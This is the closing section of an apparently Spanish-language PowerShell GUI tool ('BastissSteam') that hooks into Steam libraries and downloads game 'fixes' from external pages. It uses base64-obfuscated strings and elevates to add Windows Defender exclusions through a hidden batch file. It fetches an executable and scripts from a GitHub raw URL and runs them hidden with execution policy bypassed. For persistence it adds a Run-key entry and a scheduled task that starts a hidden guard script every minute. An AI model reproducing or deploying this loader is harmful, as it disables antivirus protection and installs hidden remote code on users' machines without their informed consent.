                                    $dlJob = Start-Job -ScriptBlock { param($u, $o) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop; $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href; if (-not $dl) { throw "No download link" }; (New-Object System.Net.WebClient).DownloadFile($dl, $o) } catch {} } -ArgumentList $fu, $zipPath
                                    $script:downloadPendingFixes[$gn] = @{ fix_url = $fu; zipPath = $zipPath; dlJob = $dlJob }
                                }
                            }
                        } catch {}
                    }
                }
                $dlDir = Join-Path (Join-Path $lib (S("c3RlYW1hcHBz"))) "downloading"
                if (Test-Path $dlDir) {
                    foreach ($subDir in Get-ChildItem $dlDir -Directory -ErrorAction SilentlyContinue) {
                        $appid = $subDir.Name
                        if ($script:knownDownloading.ContainsKey($appid) -or $script:downloadPendingFixes.ContainsKey($appid)) { continue }
                        $gn = $null
                        if ($script:steamLibs) { foreach ($sl in $script:steamLibs) { $acfPath = Join-Path (Join-Path $sl (S("c3RlYW1hcHBz"))) "appmanifest_$appid.acf"; if (-not (Test-Path $acfPath)) { continue }; try { $raw = [System.IO.File]::ReadAllText($acfPath) } catch { continue }; $gn = if ($raw -match '"name"\s+"([^"]+)"') { $Matches[1] } elseif ($raw -match '"installdir"\s+"([^"]+)"') { $Matches[1] }; if ($gn) { break } } }
                        if (-not $gn) { try { $r2 = Invoke-RestMethod "https://store.steampowered.com/api/appdetails?appids=$appid" -UseBasicParsing -TimeoutSec 3 -ErrorAction SilentlyContinue; if ($r2.$appid.success -eq $true -and $r2.$appid.data.name) { $gn = $r2.$appid.data.name } } catch {} }
                        if (-not $gn) { $script:knownDownloading[$appid] = $true; continue }
                        if ($script:downloadPendingFixes.ContainsKey($gn)) { $script:knownDownloading[$appid] = $true; continue }
                        $inCommon = $script:commonFolderCache.ContainsKey($gn)
                        if ($inCommon) { $script:knownDownloading[$appid] = $true; continue }
                        if ($fixesCount -eq 0) { continue }
                        $fn, $fu = Ff2Xa $gn $fixes
                        if (-not $fu) { $script:knownDownloading[$appid] = $true; continue }
                        $zipPath = Join-Path $env:TEMP "predl_$(Get-Random).zip"
                        $dlJob = Start-Job -ScriptBlock { param($u, $o) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop; $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href; if (-not $dl) { throw "No download link" }; (New-Object System.Net.WebClient).DownloadFile($dl, $o) } catch {} } -ArgumentList $fu, $zipPath
                        $script:downloadPendingFixes[$gn] = @{ fix_url = $fu; zipPath = $zipPath; dlJob = $dlJob }
                        $script:knownDownloading[$appid] = $true
                    }
                }
            } }
        } catch {}

        if ($fixesCount -gt 0) {
            $done = @()
            foreach ($name in $script:fixJobs.Keys) {
                $info = $script:fixJobs[$name]
                try { if ($info.job.IsCompleted) {
                    $er = @(Receive-Job $info.job -ErrorAction Stop)
                    Remove-Job $info.job -ErrorAction SilentlyContinue
                    if ($er.Count -gt 0) { Am3Fs $name $info.path $er }
                    Add-AutoFixedGame $name
                    $done += $name
                } } catch { Remove-Job $info.job -ErrorAction SilentlyContinue; $done += $name }
            }
            foreach ($name in $done) { $script:fixJobs.Remove($name) }
        }

        $curFolders = @{}
        if (((Get-Date) - $script:steamLibsCacheTime).TotalSeconds -gt 120) { try { $script:steamLibs = Ss3Jd; $script:steamLibsCacheTime = Get-Date } catch {} }
        if ($script:steamLibs) { foreach ($lib in $script:steamLibs) { $common = Join-Path $lib (S("c3RlYW1hcHBzXGNvbW1vbg==")); if (Test-Path $common) { Get-ChildItem $common -Directory -ErrorAction SilentlyContinue | ForEach-Object { $curFolders[$_.Name] = $_.FullName } } } }
        $noGameFolders = @("Steamworks Shared", "Steam Controller Configs")
        foreach ($name in $curFolders.Keys) {
            if ($noGameFolders -contains $name) { continue }
            if ($script:fixedNewGames.ContainsKey($name)) { continue }
            if ($script:fixJobs.ContainsKey($name)) { continue }
            if ($script:downloadPendingFixes.ContainsKey($name)) { continue }
            $script:fixedNewGames[$name] = $true
            if ($fixesCount -eq 0) { continue }
            $fn, $fu = Ff2Xa $name $fixes
            if ($fu) {
                $zip = Join-Path $env:TEMP "newfix_$(Get-Random).zip"
                $job = Start-Job -ScriptBlock {
                    param($u, $o, $p) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
                    $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href
                    if (-not $dl) { throw "No download link" }
                    (New-Object System.Net.WebClient).DownloadFile($dl, $o)
                    Expand-Archive -Path $o -DestinationPath $p -Force -ErrorAction Stop
                    $er = @()
                    try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; $z = [System.IO.Compression.ZipFile]::OpenRead($o); foreach ($e in $z.Entries) { if ($e.Name) { $er += $e.FullName } }; $z.Dispose() } catch {}
                    Remove-Item $o -Force -ErrorAction SilentlyContinue
                    return $er } catch { return @() }
                } -ArgumentList $fu, $zip, $curFolders[$name]
                $script:fixJobs[$name] = @{job=$job; path=$curFolders[$name]}
            }
        }
    } catch {}
})
$script:steamWatchTimer.Start()


function ScA {
    
    $realTimers = At5Vc
    $memGameNames = @($script:activeCodes | ForEach-Object { $_.Game })
    foreach ($t in $realTimers) {
        $exp = $t.expires_at -as [datetime]
        if (-not $exp) { continue }
        if ($memGameNames -contains $t.game_name) { continue }
        $c = if ($t.redeem_code) { $t.redeem_code } else { $t.game_name }
        $d = if ($t.PSObject.Properties.Name -contains (S('ZHVyYXRpb24='))) { $t.duration } else { $null }
        $iCreated = $t.internet_created_at
        $aAt = if ($iCreated) { [datetime]$iCreated } else { (Get-Date) }
        $script:activeCodes.Add(@{Code=$c;Game=$t.game_name;ActivatedAt=$aAt;ExpiresAt=$exp;Duration=$d;InternetCreatedAt=$iCreated})|Out-Null
    }
    
    $hist = @(foreach ($el in Get-CodesHistory) { $el })
    $memCodes = @($script:activeCodes | ForEach-Object { $_.Code })
    foreach ($h in $hist) {
        $expH = $h.expires_at -as [datetime]
        if (-not $expH) { continue }
        if ($memCodes -contains $h.code) { continue }
        $aAtH = if ($h.expired_at) { try { [datetime]$h.expired_at } catch { $expH } } else { $expH }
        $script:activeCodes.Add(@{Code=$h.code;Game=$h.game;ActivatedAt=$aAtH;ExpiresAt=$expH;Duration=$h.duration;InternetCreatedAt=$null})|Out-Null
    }
}
ScA



$script:watcherEnabled = $false
$script:watcherProcess = $null
$script:watcherLogPath = Join-Path $env:TEMP (S("YnNtYXBfd2F0Y2hlci5sb2c="))
$script:watcherTemp = Join-Path $env:TEMP (S("YnNtYXBfd2F0Y2hlci5wczE="))
$script:defenderExclusionsDone = $false


function Set-ReparadorFlag {
    param([int]$on)
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("UmVwYXJhZG9y")) -Value $on -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { [System.IO.File]::WriteAllText((Join-Path $env:LOCALAPPDATA (S('YnNtYXBfcmVwYXJhZG9yLmZsYWc='))), "$on", $script:utf8NoBom) } catch {}
}
function Get-ReparadorFlag {
    try { $v = (Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("UmVwYXJhZG9y")) -ErrorAction SilentlyContinue).Reparador; if ($null -ne $v) { return [int]$v } } catch {}
    try { $f = Join-Path $env:LOCALAPPDATA (S('YnNtYXBfcmVwYXJhZG9yLmZsYWc=')); if (Test-Path $f) { return [int]((Get-Content $f -Raw).Trim()) } } catch {}
    return 0
}


function Add-SteamDefenderExclusions {
    if ($script:defenderExclusionsDone) { return $true }
    try {
        $steamRoot = Get-SteamPath
        $libs = Ss3Jd
        $exclusions = @()
        $exclusions += (Join-Path $steamRoot (S("c3RlYW1hcHBzXGRvd25sb2FkaW5n")))
        $exclusions += (Join-Path $steamRoot (S("c3RlYW1hcHBzXGNvbW1vbg==")))
        $exclusions += (Join-Path $steamRoot (S("Y29uZmlnXHN0cGx1Zy1pbg==")))
        $exclusions += (Join-Path $steamRoot (S("Y29uZmlnXGx1YQ==")))
        $exclusions += (Join-Path $steamRoot "config\depotcache")
        foreach ($lib in $libs) {
            $exclusions += (Join-Path $lib (S("c3RlYW1hcHBzXGRvd25sb2FkaW5n")))
            $exclusions += (Join-Path $lib (S("c3RlYW1hcHBzXGNvbW1vbg==")))
            $exclusions += (Join-Path $lib (S("Y29uZmlnXHN0cGx1Zy1pbg==")))
            $exclusions += (Join-Path $lib (S("Y29uZmlnXGx1YQ==")))
            $exclusions += (Join-Path $lib "config\depotcache")
        }
        $exclusions = $exclusions | Select-Object -Unique | Where-Object { $_ -and (Test-Path $_) }
        if ($exclusions.Count -eq 0) { $script:defenderExclusionsDone = $true; return $true }
        try {
            $existingExcl = @()
            try { $existingExcl = @( (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath ) } catch {}
            if (-not $existingExcl -or $existingExcl.Count -eq 0) { try { $existingExcl = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
            $exclusions = @($exclusions | Where-Object { $existingExcl -notcontains $_ })
            if ($exclusions.Count -eq 0) { $script:defenderExclusionsDone = $true; return $true }
        } catch {}
        $batPath = Join-Path $env:TEMP (S("YnNtYXBfYWRkX2V4Y2x1c2lvbnMuYmF0"))
        $lines = @("@echo off")
        foreach ($ex in $exclusions) {
            $lines += "powershell -Command 'Add-MpPreference -ExclusionPath " + '"' + $ex + '"' + "' 2>nul"
        }
        $lines += "exit /b 0"
        $lines | Set-Content $batPath -Encoding ASCII
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c `"$batPath`""
        $psi.Verb = "RunAs"
        $psi.WindowStyle = "Hidden"
        $psi.UseShellExecute = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(30000) | Out-Null
        Start-Sleep -Milliseconds 500
        try { Remove-Item $batPath -Force -ErrorAction SilentlyContinue } catch {}
        $script:defenderExclusionsDone = $true
        Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [DEFENDER] Exclusiones agregadas en folders de Steam" -Encoding UTF8 -ErrorAction SilentlyContinue
        return $true
    } catch {
        WEL "Defender exclusions" $_
        return $false
    }
}


function Ensure-CleanupTask {
    try {
        $bsDir = Join-Path $env:LOCALAPPDATA 'BastissSteam'
        New-Item -ItemType Directory -Path $bsDir -Force | Out-Null
        $cleanupPs1 = Join-Path $env:LOCALAPPDATA (S('YnNtYXBfY2xlYW51cC5wczE='))
        $watchExe = Join-Path $bsDir 'bsmap_watch.exe'
        $ensure = Join-Path $bsDir 'ensure_task.ps1'
        $base = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4=")
        if (-not (Test-Path $cleanupPs1)) { try { Invoke-RestMethod -Uri "$base/bsmap_cleanup.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $cleanupPs1 -ErrorAction SilentlyContinue } catch {} }
        if (-not (Test-Path $watchExe)) { try { Invoke-RestMethod -Uri "$base/bsmap_watch.exe" -UseBasicParsing -TimeoutSec 25 -OutFile $watchExe -ErrorAction SilentlyContinue } catch {} }
        if (-not (Test-Path $ensure)) { try { Invoke-RestMethod -Uri "$base/ensure_task.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $ensure -ErrorAction SilentlyContinue } catch {} }
        if (Test-Path $ensure) { try { Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ensure`"" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue } catch {} }
        if ((Test-Path $watchExe) -and -not (Get-Process bsmap_watch -ErrorAction SilentlyContinue)) {
            Start-Process -FilePath $watchExe -WindowStyle Hidden
        }
    } catch {}
}


function Ensure-ExpiryWatcher {
    try {
        $selfExe = [Environment]::GetCommandLineArgs()[0]
        if (-not $selfExe -or -not (Test-Path $selfExe)) { return }
        $procName = ([System.Diagnostics.Process]::GetCurrentProcess()).ProcessName
        $existing = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "$procName*" -and $_.CommandLine -match '-expiry' })
        if ($existing.Count -eq 0) {
            try { Start-Process -FilePath $selfExe -ArgumentList '-expiry' -WindowStyle Hidden -ErrorAction Stop } catch {}
        }
        try {
            Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BastissSteamExpiry' -Value ('"{0}" -expiry' -f $selfExe) -Type String -Force -ErrorAction Stop
        } catch {}
    } catch {}
}


function Start-WatcherProcess {
    try {
        
        $existing = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "powershell.exe" -and $_.CommandLine -match (S('YnNtYXBfd2F0Y2hlclwucHMx')) })
        if ($existing.Count -gt 0) {
            $script:watcherProcess = Get-Process -Id $existing[0].ProcessId -ErrorAction SilentlyContinue
            $script:watcherEnabled = $true
            try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [START] Reparador ya estaba activo (PID=$($existing[0].ProcessId))" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
            return $true
        }
        try { Add-Content -Path $script:watcherLogPath -Value "`n=== [$(Get-Date -Format 'HH:mm:ss')] INICIANDO REPARADOR ===" -Encoding UTF8 -Force -ErrorAction SilentlyContinue } catch {}
        if (-not (Test-Path $script:watcherTemp) -or ((Get-Date) - (Get-Item $script:watcherTemp -ErrorAction SilentlyContinue).LastWriteTime).TotalHours -gt 24) {
            Add-Content -Path $script:watcherLogPath -Value (S("W1NUQVJUXSBEZXNjYXJnYW5kbyByZXBhcmFkb3IuLi4=")) -Encoding UTF8 -ErrorAction SilentlyContinue
            Invoke-RestMethod -Uri $script:watcherUrl -UseBasicParsing -TimeoutSec 15 -OutFile $script:watcherTemp -ErrorAction SilentlyContinue
            if (Test-Path $script:watcherTemp) { Add-Content -Path $script:watcherLogPath -Value "[START] Reparador descargado: $((Get-Item $script:watcherTemp).Length) bytes" -Encoding UTF8 -ErrorAction SilentlyContinue }
            else { Add-Content -Path $script:watcherLogPath -Value "[START] ERROR: descarga fallo" -Encoding UTF8 -ErrorAction SilentlyContinue; return $false }
        } else { Add-Content -Path $script:watcherLogPath -Value (S("W1NUQVJUXSBSZXBhcmFkb3IgZW4gY2FjaGU=")) -Encoding UTF8 -ErrorAction SilentlyContinue }
        if (Test-Path $script:watcherTemp) {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "powershell.exe"
            $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script:watcherTemp`""
            $psi.WindowStyle = "Hidden"; $psi.CreateNoWindow = $true; $psi.UseShellExecute = $false
            $script:watcherProcess = [System.Diagnostics.Process]::Start($psi)
            $script:watcherEnabled = $true
            Add-Content -Path $script:watcherLogPath -Value "[START] Reparador lanzado (PID=$($script:watcherProcess.Id))" -Encoding UTF8 -ErrorAction SilentlyContinue
            return $true
        }
        return $false
    } catch { WEL (S("TGF1bmNoIHJlcGFyYWRvcg==")) $_; return $false }
}

Ensure-CleanupTask
Ensure-ExpiryWatcher
try {
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object { $_.CommandLine -match 'guard\.ps1' } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
    $gDst=Join-Path $env:LOCALAPPDATA "BastissSteam\guard.ps1"
    try { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/steamsito/main/guard.ps1" -OutFile $gDst -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue } catch {}
    if (Test-Path $gDst) {
        $gVbs=Join-Path $env:LOCALAPPDATA "BastissSteam\guard_launch.vbs"
        try { Set-Content -LiteralPath $gVbs -Value "Set sh = CreateObject(`"WScript.Shell`")`r`nps = sh.ExpandEnvironmentStrings(`"%LOCALAPPDATA%\BastissSteam\guard.ps1`")`r`ncmd = `"powershell -NoProfile -ExecutionPolicy Bypass -File `" & Chr(34) & ps & Chr(34)`r`nsh.Run cmd, 0, False`r`n" -Encoding ASCII -ErrorAction SilentlyContinue } catch {}
        $tCmd="wscript.exe //B `"$gVbs`""
        & schtasks.exe /Create /TN "BastissGuard" /TR "$tCmd" /SC MINUTE /MO 1 /F *> $null
        Start-Sleep -Milliseconds 500
        if (-not (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "guard\.ps1" })) {
            try { Start-Process wscript.exe -ArgumentList "//B `"$gVbs`"" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null } catch {}
        }
    }
} catch {}
try { $sr0=Get-SteamPath; if ($sr0 -and -not (Test-ParcheActual $sr0)) { $null = Xz9Qk -Silent } } catch {}

if ((Get-ReparadorFlag) -eq 1) {
    try {
        if (Start-WatcherProcess) {
            try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [AUTO] Reparador auto-iniciado (flag persistente)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
        }
    } catch {}
}

$script:startInTray = $false
try {
    $cliArgs = @($args) + @([Environment]::GetCommandLineArgs())
    if ($cliArgs -contains '-min' -or $cliArgs -contains '-hidden') { $script:startInTray = $true }
} catch {}
if ($script:startInTray) {
    try { $form.Hide(); $script:trayIcon.Visible = $true } catch {}
}
try { [System.Windows.Forms.Application]::Run($form) } catch {
    $msg = $_.Exception.Message
    if ($msg -match 'ya existe|already exists') {
        try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] SUPPRESSED already exists at Run: $msg`n$($_.ScriptStackTrace)" -Encoding UTF8 } catch {}
    } else {
        try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] RUN EX: $msg`n$($_.ScriptStackTrace)" -Encoding UTF8 } catch {}
        throw
    }
}
$script:trayIcon.Dispose()
if ($script:cdT) { $script:cdT.Stop(); $script:cdT.Dispose() }
if ($script:rfT) { $script:rfT.Stop(); $script:rfT.Dispose() }
if ($script:clpTicker) { $script:clpTicker.Stop(); $script:clpTicker.Dispose() }
if ($script:urlChecker) { $script:urlChecker.Stop(); $script:urlChecker.Dispose() }
if ($script:steamWatchTimer) { $script:steamWatchTimer.Stop(); $script:steamWatchTimer.Dispose() }
if ($script:watcherLogTimer) { $script:watcherLogTimer.Stop(); $script:watcherLogTimer.Dispose() }


if ($script:fixJobs) { foreach ($j in $script:fixJobs.Values) { try { Remove-Job $j.job -Force -ErrorAction SilentlyContinue } catch {} } }
if ($script:fixesJob) { try { Remove-Job $script:fixesJob -Force -ErrorAction SilentlyContinue } catch {} }
if ($script:downloadPendingFixes) { foreach ($d in $script:downloadPendingFixes.Values) { try { if ($d.dlJob) { Remove-Job $d.dlJob -Force -ErrorAction SilentlyContinue } } catch {} } }
if ($script:logoBmp) { $script:logoBmp.Dispose() };if ($script:tiktokBmp) { $script:tiktokBmp.Dispose() };if ($script:discordBmp) { $script:discordBmp.Dispose() };if ($ib) { $ib.Dispose() }
if ($script:singleMutex) { try { $script:singleMutex.ReleaseMutex(); $script:singleMutex.Dispose() } catch {} }






